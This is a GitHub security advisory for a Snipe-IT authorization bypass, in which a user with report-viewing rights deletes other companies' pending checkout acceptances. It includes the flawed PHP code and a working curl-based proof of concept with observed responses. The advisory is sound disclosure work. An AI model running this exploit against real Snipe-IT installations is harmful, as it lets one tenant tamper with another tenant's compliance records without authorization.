# [M] Snipe-IT: Cross-company deletion of pending checkout acceptances via unscoped report endpoint

## Summary
Severity: Medium
Advisory: GHSA-35cr-9hqq-p2mg
CVE: CVE-2026-55515
CWE: CWE-639
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:N/I:L/A:N (CVSS_V3)
Published: 2026-08-28
Source: https://github.com/advisories/GHSA-35cr-9hqq-p2mg
Type: github-advisory

## Affected
- Packagist: `snipe/snipe-it` — affected >=0 <8.6.2

## Details
### Impact
A user with the `reports.view` permission can delete pending checkout acceptance records by global ID, even when the acceptance belongs to an asset in another company.

The report listing page appears to scope visible unaccepted assets, but the delete endpoint directly looks up CheckoutAcceptance::pending()->find($acceptanceId) and deletes it without checking whether the current user has access to the related checkoutable asset.


### Preconditions
The attacker needs:
- A valid authenticated web session.
- `reports.view` permission.
- Knowledge or guessability of a pending `checkout_acceptances.id`.

The attacker does not need access to the asset/company associated with the target acceptance.

### Root cause
The delete action authorizes only report access, then deletes a pending acceptance by global ID:

```php

$this->authorize('reports.view');

$acceptance = CheckoutAcceptance::pending()->find($acceptanceId);

$acceptance->delete();
```

The code does not check whether the current user can access the acceptance’s related checkoutable asset/accessory/license/etc.
In multi-company mode, this allows a reports user from one company to delete acceptance records belonging to another company.

### Proof of concept
#### Target acceptance belongs to Company B

The target pending acceptance was identified as id=1.

```sql
snipe_sql "SELECT ca.id ca.checkoutable_id, ca.deleted_at, a.asset_tag, a.company_id
FROM checkout_acceptances ca
JOIN assets a ON a.id = ca.checkoutable_id
WHERE ca.id=$ACCEPTANCE_B_ID;"
```
Observed result:

```json
{
    "id": 1,
    "checkoutable_id": 2,
    "deleted_at": null,
    "asset_tag": "LAB-B-42445107",
    "company_id": 3
}
```

This shows the pending acceptance belongs to asset 2, which is in Company B.

#### Attacker user belongs to Company A
The attacker account was reporter_a, assigned to Company A with only report viewing permission:

```json
{
    "id": 3,
    "username": "reporter_a",
    "company_id": 2,
    "permissions": {
        "reports.view": 1
    }
}
```

Login as Company A reports user

```curl
curl -sS -c /tmp/snipe_cookie.txt "$BASE/login" -o /tmp/snipe_login.html

LOGIN_CSRF=$(grep -oP 'name="_token" value="\K[^"]+' /tmp/snipe_login.html)

curl -sS -i -b /tmp/snipe_cookie.txt -c /tmp/snipe_cookie.txt \
  -X POST "$BASE/login" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "_token=$LOGIN_CSRF" \
  --data-urlencode "username=reporter_a" \
  --data-urlencode "password=password"
```

**Observed response:**

```HTTP/1.1 302 Found
Location: http://localhost:8000/
```

Fetch report CSRF token

```curl
curl -sS -L -b /tmp/snipe_cookie.txt -c /tmp/snipe_cookie.txt \
  "$BASE/reports/unaccepted_assets" \
  -o /tmp/unaccepted.html \
  -w "\nHTTP=%{http_code} URL=%{url_effective}\n"


CSRF=$(grep -oP 'name="csrf-token" content="\K[^"]+' /tmp/unaccepted.html)

echo "CSRF=$CSRF"
```

**Observed result:**

```
HTTP=200 URL=http://localhost:8000/reports/unaccepted_assets
CSRF=aRwAVRk5sPLdl7Pbw8vCQJRXN9vTqxVilkgH8JkU
```

**Delete Company B acceptance as Company A reporter**

```curl
curl -i -b /tmp/snipe_cookie.txt -c /tmp/snipe_cookie.txt \
  -X POST "$BASE/reports/unaccepted_assets/$ACCEPTANCE_B_ID/delete" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "_token=$CSRF" \
  --data-urlencode "_method=DELETE"
```

**Observed response:**
```
HTTP/1.1 302 Found
Location: http://localhost:8000/reports/unaccepted_assets
```

**Final state**
```sql 
snipe_sql "SELECT id, checkoutable_id, deleted_at
FROM checkout_acceptances
WHERE id=$ACCEPTANCE_B_ID;"
```

**Observed result:**

```json
{
    "id": 1,
    "checkoutable_id": 2,
    "deleted_at": "2026-06-12 04:30:00"
}
```

This confirms that reporter_a from Company A deleted a pending acceptance for Company B’s asset.

### Security impact
This is a cross-company authorization bypass affecting checkout acceptance integrity.
An attacker with report access can:

- Delete pending acceptance records for assets they cannot access.
- Suppress evidence that a user has not accepted custody or terms.
- Interfere with asset handoff/compliance workflows.
- Tamper with another company’s pending acceptance queue.

This is not intended functionality because the application should enforce company scope on destructive actions, not only on report display.

## References
- https://github.com/grokability/snipe-it/security/advisories/GHSA-35cr-9hqq-p2mg
- https://nvd.nist.gov/vuln/detail/CVE-2026-55515
- https://github.com/grokability/snipe-it/commit/802067f3987a4b65bfc2efe60e22e07c24e01e6a
- https://github.com/grokability/snipe-it
- https://github.com/grokability/snipe-it/releases/tag/v8.6.2
